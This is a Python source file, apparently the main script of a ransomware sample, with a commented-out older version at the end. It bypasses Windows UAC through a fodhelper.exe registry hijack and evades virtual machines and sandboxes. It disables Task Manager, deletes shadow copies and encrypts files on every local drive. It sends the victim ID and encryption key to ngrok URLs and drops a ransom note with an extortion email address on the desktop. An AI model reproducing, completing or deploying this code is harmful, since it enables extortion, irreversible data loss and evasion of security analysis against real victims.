# Extracted from https://dzone.com/articles/bypassing-windows-10-uac-withnbsppython
from CryptoManager import CryptoManager
from VirtualEnvironmentDetector import VirtualEnvironmentDetector
import winshell
import uuid
import os
import sys
import ctypes
import winreg

CMD                   = r"C:\Windows\System32\cmd.exe"
FOD_HELPER            = r'C:\Windows\System32\fodhelper.exe'
PYTHON_CMD            = "python"
REG_PATH              = 'Software\Classes\ms-settings\shell\open\command'
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'


def is_running_as_admin():
    '''
    Checks if the script is running with administrative privileges.
    Returns True if is running as admin, False otherwise.
    '''    
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def create_reg_key(key, value):
    '''
    Creates a reg key
    '''
    try:        
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)                
        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)        
        winreg.CloseKey(registry_key)
    except WindowsError:        
        raise


def bypass_uac(cmd):
    '''
    Tries to bypass the UAC
    '''
    try:
        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
        create_reg_key(None, cmd)    
    except WindowsError:
        raise


def execute_protocol(antivm=True, send_post=True, executable=True):        
    if not is_running_as_admin():
        try:
            if executable:
                name = sys.executable
                cmd = '{} /k {}'.format(CMD, name)
            else:
                cmd = '{} /k {} {}'.format(CMD, PYTHON_CMD, __file__)
            print(cmd)
            bypass_uac(cmd)                
            os.system(FOD_HELPER)                
            sys.exit(0)                
        except WindowsError:
            sys.exit(1)
    else:
            print("Executing encryption protocol")
            # Algunas comprobaciones antes de iniciar el protocolo
            ved = VirtualEnvironmentDetector(dodelay=False)
            
            if not ved.is_windows():
                print('Nothing to do here...')
                sys.exit()

            if antivm: 
                if ved.neo_takes_blue_pill(tolerance=0):
                    print('Exiting the matrix...')
                    sys.exit()

                if ved.delay_anti_cuckoo(5*60):
                    print("We are being analyzed...")
                    sys.exit()

            cm = CryptoManager(action='encrypt')

            id = uuid.uuid1() # uuid1() is defined in UUID library and helps to generate the random id using MAC address and time component.

            try:
                cm.disable_task_manager()
                cm.delete_shadowcopies()
                print("Task manager disabled and shadow copies eliminated")
            except:
                print("Disable task scheduler and delete shadow copies operations failed")

            local_drives = cm.get_local_drives()

            cm.search_and_split(local_drives)
            
            for ld in local_drives:
                for root, dirs, files in os.walk(ld):
                    [dirs.remove(d) for d in list(dirs) if d in cm.PROTECTED_DIRS]
                    for fn in files:
                        full_path = root + os.sep + fn
                        ext=cm.get_file_extension(full_path)
                        if ext in cm.TARGET_EXT and ext not in cm.EXCLUDED_EXT:
                            cm.symmetric_encrypt_or_decrypt(full_path)
                            print(full_path + ' -> [encrypted]')
            
            if send_post: cm.send_post_request(url='http://3d1843105e2e.ngrok.io', id=str(id), key=cm.key)

            msg = 'ATTENTION! ALL YOUR DATA ARE PROTECTED WITH AES ALGORITHM\nYour security system was vulnerable, so all of your files are encrypted.\nIf you want to restore them, contact us by email: restoreyourfiles.gengar@gmail.com, indicating {} as email subject.\n\nBE CAREFUL AND DO NOT DAMAGE YOUR DATA:\nDo not rename encrypted files.\nDo not try to decrypt your data using third party software, it may cause permanent data loss.\nDo not trust anyone! Only we have keys to your files! Without this keys restore your data is impossible\n\nWE GUARANTEE A FREE DECODE AS A PROOF OF OUR POSSIBILITIES:\nYou can send us 2 files for free decryption.\nSize of file must be less than 1 Mb (non archived). We don`t decrypt for test DATABASE, XLS and other important files.\n\nDO NOT ATTEMPT TO DECODE YOUR DATA YOURSELF, YOU ONLY DAMAGE THEM AND THEN YOU LOSE THEM FOREVER\nAFTER DECRYPTION YOUR SYSTEM WILL RETURN TO A FULLY NORMALLY AND OPERATIONAL CONDITION!'.format(id)
            desktop_path = winshell.desktop()

            # Copy Ransom Note
            with open(os.path.join(desktop_path, 'info.txt'), 'w') as ransom_note:
                ransom_note.write(msg)
            
            print('All data was successfully encrypted')
       

if __name__ == '__main__':
    execute_protocol(antivm=False, send_post=False, executable=False)
    
"""
from CryptoManager import CryptoManager
from VirtualEnvironmentDetector import VirtualEnvironmentDetector
import os
import sys
import winshell
import uuid


if __name__ == '__main__':
    print("Executing encryption protocol")

    # Algunas comprobaciones antes de iniciar el protocolo
    ved = VirtualEnvironmentDetector(dodelay=False)
    
    if not ved.is_windows():
        print('Nothing to do here...')
        sys.exit()

    if ved.neo_takes_blue_pill(tolerance=10):
        print('Exiting the matrix...')
        sys.exit()

    if ved.delay_anti_cuckoo(0):
        print("We are being analyzed...")
        sys.exit()

    cm = CryptoManager(action='encrypt')

    id = uuid.uuid1() # uuid1() is defined in UUID library and helps to generate the random id using MAC address and time component.

    try:
        cm.disable_task_manager()
        cm.delete_shadowcopies()
        print("Task manager disbled and shadow copies eliminated")
    except:
        print("Disable task scheduler and delete shadow copies operations failed")

    local_drives = cm.get_local_drives()

    cm.search_and_split(local_drives)
    
    for ld in local_drives:
        for root, dirs, files in os.walk(ld):
            [dirs.remove(d) for d in list(dirs) if d in cm.PROTECTED_DIRS]
            for fn in files:
                full_path = root + os.sep + fn
                ext=cm.get_file_extension(full_path)
                if ext in cm.TARGET_EXT and ext not in cm.EXCLUDED_EXT:
                    cm.symmetric_encrypt_or_decrypt(full_path)
                    print(full_path + ' -> [encrypted]')
    
    cm.send_post_request(url='http://81fa332e8256.ngrok.io', id=str(id), key=cm.key)

    msg = 'ATTENTION! ALL YOUR DATA ARE PROTECTED WITH AES ALGORITHM\nYour security system was vulnerable, so all of your files are encrypted.\nIf you want to restore them, contact us by email: restoreyourfiles.gengar@gmail.com, indicating {} as email subject.\n\nBE CAREFUL AND DO NOT DAMAGE YOUR DATA:\nDo not rename encrypted files.\nDo not try to decrypt your data using third party software, it may cause permanent data loss.\nDo not trust anyone! Only we have keys to your files! Without this keys restore your data is impossible\n\nWE GUARANTEE A FREE DECODE AS A PROOF OF OUR POSSIBILITIES:\nYou can send us 2 files for free decryption.\nSize of file must be less than 1 Mb (non archived). We don`t decrypt for test DATABASE, XLS and other important files.\n\nDO NOT ATTEMPT TO DECODE YOUR DATA YOURSELF, YOU ONLY DAMAGE THEM AND THEN YOU LOSE THEM FOREVER\nAFTER DECRYPTION YOUR SYSTEM WILL RETURN TO A FULLY NORMALLY AND OPERATIONAL CONDITION!'.format(id)
    desktop_path = winshell.desktop()

    # Copy Ransom Note
    with open(os.path.join(desktop_path, 'info.txt'), 'w') as ransom_note:
        ransom_note.write(msg)
    
    print('All data was successfully encrypted')
"""
    


    

